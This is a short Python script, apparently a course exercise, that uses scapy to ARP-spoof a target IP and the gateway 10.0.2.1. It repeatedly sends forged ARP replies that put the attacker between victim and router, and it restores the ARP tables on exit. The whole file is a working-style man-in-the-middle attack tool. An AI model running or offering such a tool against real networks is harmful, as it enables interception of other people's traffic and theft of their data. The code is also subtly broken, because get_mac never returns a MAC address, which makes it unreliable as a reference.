#!/usr/bin/env python
import scapy.all as scapy
import argparse
import sys
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="ip", help=("Target Ip address"))
    options = parser.parse_args()
    if not options.ip:
        print("[-] Please specify an Ip range, --help for more info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac= get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

gateway_ip = "10.0.2.1"
count = 0
try:
    while True:
        spoof(get_arguments().ip, gateway_ip)
        spoof(gateway_ip, get_arguments().ip)
        count = count + 2
        print("\r[+] Packets Sent: " + str(count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] CTRL + C Detected.....Resetting ARP tables.....Please wait.\n")
    restore(get_arguments().ip, gateway_ip)
    restore(gateway_ip, get_arguments().ip)